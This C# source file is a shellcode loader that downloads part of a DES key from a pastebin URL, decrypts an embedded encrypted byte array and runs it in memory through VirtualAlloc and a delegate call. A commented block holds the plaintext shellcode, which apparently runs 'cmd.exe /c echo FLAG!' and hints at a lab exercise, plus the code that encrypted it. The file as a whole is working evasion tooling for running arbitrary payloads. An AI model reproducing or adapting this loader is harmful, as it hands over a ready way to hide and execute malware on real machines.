using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Threading.Tasks;
using System.Reflection.Metadata;

namespace payload_loader
{
    class Program
    {
        static async Task Main(string[] args)
        {
            string url = "https://pastebin.com/raw/pVLUWuCn";
            string key1 = "1234";
            string key2 = await GetPass(url);
            string key = key1 + key2;
            Console.WriteLine(key);

            //byte[] payload = new byte[] {
            //    0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
            //    0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
            //    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
            //    0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
            //    0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
            //    0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
            //    0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
            //    0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
            //    0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
            //    0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
            //    0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
            //    0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
            //    0x00,0x53,0xff,0xd5,0x63,0x6d,0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,
            //    0x65,0x63,0x68,0x6f,0x20,0x46,0x4c,0x41,0x47,0x21,0x00 };

            //string plaintext = Convert.ToBase64String(payload);

            //Console.WriteLine("Original Text: " + plaintext);

            //string encrypted = Encrypt(plaintext, key);
            //Console.WriteLine("Encrypted: " + encrypted);
            //        byte[] encryptedBytes = Convert.FromBase64String(encrypted);
            //        Console.WriteLine("byte[] encryptedArray = new byte[] { " +
            //string.Join(", ", Array.ConvertAll(encryptedBytes, b => "0x" + b.ToString("X2"))) +
            //" };");

            byte[] encrypted = new byte[] {
                0xCD, 0xA7, 0x03, 0xC9, 0x75, 0x2F, 0x21, 0xB7, 0x51, 0xC4, 0x11, 0x49, 0x8F,
                0x96, 0x22, 0x2B, 0x07, 0x70, 0xAC, 0x30, 0x0A, 0x72, 0xC8, 0xD2, 0x8B, 0xFF,
                0x97, 0x8A, 0x2F, 0xF7, 0x2F, 0xBA, 0x14, 0x1F, 0x58, 0x52, 0x7E, 0xCA, 0x59,
                0x69, 0x67, 0xA7, 0x04, 0x61, 0x44, 0xED, 0x25, 0x30, 0x6A, 0x03, 0xAA, 0xF1,
                0xDF, 0x36, 0x27, 0x0A, 0xA9, 0xAC, 0xAE, 0xD8, 0x6B, 0xE0, 0xAE, 0xD3, 0x2B,
                0x48, 0x5F, 0x04, 0x65, 0x5F, 0xE1, 0x2D, 0xA5, 0x02, 0x78, 0xDB, 0x62, 0xD5,
                0x87, 0xFD, 0x15, 0xED, 0xBD, 0x8A, 0xB2, 0xF7, 0xDE, 0x4D, 0x92, 0xFF, 0x2E,
                0x89, 0xF4, 0x7B, 0xD5, 0xAF, 0x13, 0x7E, 0x55, 0x90, 0x60, 0x82, 0x62, 0xC3,
                0x30, 0xA4, 0x50, 0xAB, 0xAD, 0x04, 0xA3, 0x26, 0xF9, 0xC8, 0x57, 0x75, 0xA9,
                0xF1, 0xFA, 0x9B, 0x35, 0x74, 0xDA, 0x41, 0x28, 0x6A, 0x89, 0xA5, 0xCC, 0x9E,
                0x5F, 0x2D, 0xC2, 0xDA, 0x0B, 0x51, 0xF0, 0xFD, 0xCB, 0xB5, 0xF1, 0x89, 0x5A,
                0x9E, 0x17, 0x59, 0xE1, 0xCB, 0xCF, 0xC2, 0xDD, 0xE6, 0xCE, 0x76, 0x22, 0x2B,
                0x79, 0x5D, 0xFC, 0x3E, 0x88, 0xA5, 0x0C, 0xF0, 0x1A, 0xAA, 0xA3, 0x63, 0x28,
                0x0B, 0xFC, 0xDF, 0xB8, 0x82, 0x6F, 0x62, 0x00, 0x5C, 0x8C, 0xFA, 0x2E, 0xC3,
                0xE4, 0x4F, 0xF8, 0xC3, 0x1D, 0x20, 0x98, 0xEA, 0x52, 0x45, 0x24, 0xA5, 0x4D,
                0xBC, 0x63, 0x8A, 0xDC, 0x97, 0x41, 0x9E, 0xC7, 0x9E, 0x98, 0xED, 0xA8, 0xB6,
                0xAD, 0xE2, 0x19, 0x20, 0xED, 0x00, 0x68, 0x90, 0x3A, 0xEF, 0x58, 0x1B, 0x8D,
                0x08, 0xA5, 0xC9, 0x0F, 0x3A, 0xC7, 0x96, 0xD9, 0x3D, 0x01, 0xF6, 0x44, 0x52,
                0x2E, 0x11, 0x59, 0x08, 0x40, 0xAB, 0x15, 0xAD, 0xB2, 0xFE, 0x16, 0x37, 0xB5,
                0x04, 0xA4, 0x3D, 0x36, 0x8A, 0xE0, 0x13, 0x41, 0xBD, 0x11, 0x31, 0x04, 0xC3,
                0x1A, 0x62, 0x2A, 0xDC, 0xD7, 0x72, 0xBB, 0xB5, 0x32, 0xAF, 0x31, 0xF6, 0xB1,
                0x34, 0xC5, 0x69, 0x42, 0x2F, 0x50, 0x62 };
            
            string decrypted = Convert.ToBase64String(encrypted);

            decrypted = Decrypt(decrypted, key);
            //Console.WriteLine("Decrypted: " + decrypted);

            byte[] decryptedBytes = Convert.FromBase64String(decrypted);

            ShellcodeLoader.RunShellcode(decryptedBytes);
        }

        public static async Task<string> GetPass(string url)
        {
            using HttpClient client = new HttpClient();
            string content = await client.GetStringAsync(url);
            //Console.WriteLine(content);
            return content;
        }

        public static string Encrypt(string plainText, string key)
        {
            if (key.Length < 8)
                throw new ArgumentException("Key must be at least 8 characters long.");

            using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
            {
                des.Mode = CipherMode.CBC;
                des.Padding = PaddingMode.PKCS7;
                des.Key = Encoding.UTF8.GetBytes(key.Substring(0, 8));
                des.IV = Encoding.UTF8.GetBytes(key.Substring(0, 8));

                byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, des.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(plainBytes, 0, plainBytes.Length);
                    cs.FlushFinalBlock();
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }

        public static string Decrypt(string cipherText, string key)
        {
            if (key.Length < 8)
                throw new ArgumentException("Key must be at least 8 characters long.");

            using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
            {
                des.Mode = CipherMode.CBC;
                des.Padding = PaddingMode.PKCS7;
                des.Key = Encoding.UTF8.GetBytes(key.Substring(0, 8));
                des.IV = Encoding.UTF8.GetBytes(key.Substring(0, 8));

                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(cipherBytes, 0, cipherBytes.Length);
                    cs.FlushFinalBlock();
                    return Encoding.UTF8.GetString(ms.ToArray());
                }
            }
        }
    }

    public static class ShellcodeLoader
    {
        public static void RunShellcode(byte[] shellcode)
        {
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
            pFunc f = (pFunc)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(pFunc));
            f();
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        private delegate void pFunc();
    }
}
